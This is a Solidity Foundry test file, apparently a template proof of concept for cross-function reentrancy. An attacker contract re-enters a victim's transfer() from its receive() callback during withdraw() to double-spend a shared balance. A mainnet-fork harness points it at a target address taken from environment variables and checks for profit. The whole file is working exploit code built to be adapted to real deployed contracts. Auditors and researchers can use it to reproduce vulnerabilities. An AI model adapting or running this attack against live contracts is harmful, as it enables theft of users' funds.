// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Cross-function reentrancy
/// @notice Detector: reentrancy (cross-function). Two functions share one
///         balance mapping. withdraw() sends ETH before updating state, and
///         the attacker re-enters a DIFFERENT function (transfer/send) that
///         reads the same not-yet-updated balance, double-spending it.
///         A reentrancy guard on withdraw() alone does NOT stop this.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the second function name to
///      the target (transfer / transferTo / send / move / pay).

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
    // TODO: second function sharing the balance mapping.
    function transfer(address to, uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
}

contract CrossFunctionAttacker {
    IVictim public immutable victim;
    bool public reentered;

    constructor(address victim_) {
        victim = IVictim(victim_);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
        // After the callback moved credit a second time, withdraw again.
        victim.withdraw();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Re-enter through the OTHER function, not withdraw().
            victim.transfer(address(this), msg.value);
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        CrossFunctionAttacker attacker = new CrossFunctionAttacker(target);
        uint256 attackerBefore = address(attacker).balance;

        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}();

        uint256 profit = address(attacker).balance - attackerBefore;
        console.log("attacker profit:", profit);
        assertGt(profit, 1 ether, "exploit did not reproduce: no double-spend via second function");
    }
}
